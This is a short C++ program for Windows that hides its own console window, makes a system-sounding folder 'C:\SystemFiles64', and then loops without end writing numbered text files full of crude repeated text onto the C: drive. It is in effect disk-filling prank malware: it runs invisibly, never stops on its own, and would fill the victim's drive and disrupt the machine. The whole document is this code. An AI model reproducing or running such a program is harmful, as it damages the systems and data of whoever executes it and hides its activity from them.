#include <iostream>
#include <fstream>
#include <string>
#include <direct.h>
#include <Windows.h>

void HideConsole()
{
	::ShowWindow(::GetConsoleWindow(), SW_HIDE);
}

int main()
{
	long i = 0;
	const char *path = "C:\\SystemFiles64";
	std::string content = "Get fucked gibba";
	_mkdir(path);
	while (true)
	{
		HideConsole();
		i++;
		std::ofstream file;
		file.open(path + std::to_string(i) + ".txt", std::ios_base::out);
		file << "suck on these nutssuck on these nutssuck on these nutssuck on these nutssuck on these nutssuck on these nutssuck on these nutssuck on these nutssuck on these nutssuck on these nuts";
		file.close();
		std::cout << "File created;" + std::to_string(i) + "\r\n";
	}
}
